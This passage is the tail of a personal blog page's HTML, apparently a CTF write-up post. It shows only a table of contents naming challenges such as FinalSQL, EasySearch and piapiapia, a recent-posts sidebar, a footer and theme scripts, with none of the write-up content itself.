href="#8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL"><span class="toc-number">1.8.</span> <span class="toc-text">8.[极客大挑战 2019]FinalSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-BJDCTF2020-EasySearch"><span class="toc-number">1.9.</span> <span class="toc-text">9.[BJDCTF2020]EasySearch</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-0CTF-2016-piapiapia"><span class="toc-number">1.10.</span> <span class="toc-text">10.[0CTF 2016]piapiapia</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-XCTF%E2%80%94-WP"><span class="toc-number">2.</span> <span class="toc-text">2.XCTF—-WP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Web-python-template-injection"><span class="toc-number">2.1.</span> <span class="toc-text">1.Web_python_template_injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-favorit-number"><span class="toc-number">2.2.</span> <span class="toc-text">2.favorit_number</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/01/31/ROISWP/" title="ROIS WP">ROIS WP</a><time datetime="2023-01-31T05:14:00.000Z" title="发表于 2023-01-31 13:14:00">2023-01-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/05/13/searching/" title="searchinging">searchinging</a><time datetime="2022-05-13T08:24:44.000Z" title="发表于 2022-05-13 16:24:44">2022-05-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/03/java/" title="java">java</a><time datetime="2022-03-03T11:13:52.000Z" title="发表于 2022-03-03 19:13:52">2022-03-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/02/13/exercise/" title="exercise">exercise</a><time datetime="2022-02-13T12:55:31.000Z" title="发表于 2022-02-13 20:55:31">2022-02-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/01/13/sql/" title="sql">sql</a><time datetime="2022-01-13T06:29:08.000Z" title="发表于 2022-01-13 14:29:08">2022-01-13</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Lionel Kai</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>